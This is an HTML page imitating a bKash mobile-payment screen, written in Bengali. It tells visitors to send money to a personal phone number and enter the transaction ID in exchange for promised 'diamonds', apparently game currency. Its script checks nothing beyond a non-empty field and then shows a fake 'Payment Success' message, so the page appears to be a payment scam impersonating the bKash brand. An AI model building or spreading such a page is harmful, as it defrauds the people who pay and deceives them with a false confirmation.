<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>bKash Payment</title>
<style>
body { background: #E2136E; color: #fff; padding: 15px; }
.box { background: #fff; color: #333; padding: 15px; border-radius: 10px; margin-bottom: 15px; }
.trx-input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 15px; }
.verify-btn { width: 100%; background: #d50032; color: #fff; padding: 15px; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; }
.success { background: #4CAF50; color: #fff; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 10px; display: none; }
.copy-btn { background: #666; color: #fff; border: none; padding: 3px 10px; border-radius: 5px; }
</style>
</head>
<body>
<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/BKash_bKash_Logo.png" style="width:100px; background:#fff; padding:10px; border-radius:10px; display:block; margin:0 auto 15px;">
<div class="box">Wallet</div>
<div class="box">৳ <span id="amount">0</span></div>
<div id="success" class="success">✅ 1.3 সেকেন্ডের মধ্যে ডায়মন্ড পেয়ে যাবেন!</div>
<div class="box">
<h3 style="text-align:center; color:#000;">ট্রান্সজেকশন আইডি দিন</h3>
<input type="text" id="trxId" class="trx-input" placeholder="ট্রান্সজেকশন আইডি দিন">
<ul style="list-style:none; color:#fff;">
<li>*247# ডায়াল করে bKash এ যান</li>
<li><b>"Send Money"</b> -এ ক্লিক করুন।</li>
<li>প্রাপক নম্বর: <b style="color:yellow;">01873786543</b> <button class="copy-btn" onclick="copy('01873786543')">Copy</button></li>
<li>টাকার পরিমাণ: <b style="color:yellow;" id="tk">0</b></li>
</ul>
<button class="verify-btn" onclick="verify()">VERIFY</button>
</div>

<script>
let amount = localStorage.getItem('amount');
document.getElementById('amount').innerText = amount;
document.getElementById('tk').innerText = amount;
function verify(){
  if(document.getElementById('trxId').value == ''){ alert("Transaction ID দিন"); return; }
  document.getElementById('success').style.display = 'block';
  setTimeout(()=>{ alert("Payment Success! 1.3s এর মধ্যে ডায়মন্ড পাবেন"); },1300);
}
function copy(num){ navigator.clipboard.writeText(num); alert("Copied: "+num); }
</script>
</body>
  </html>
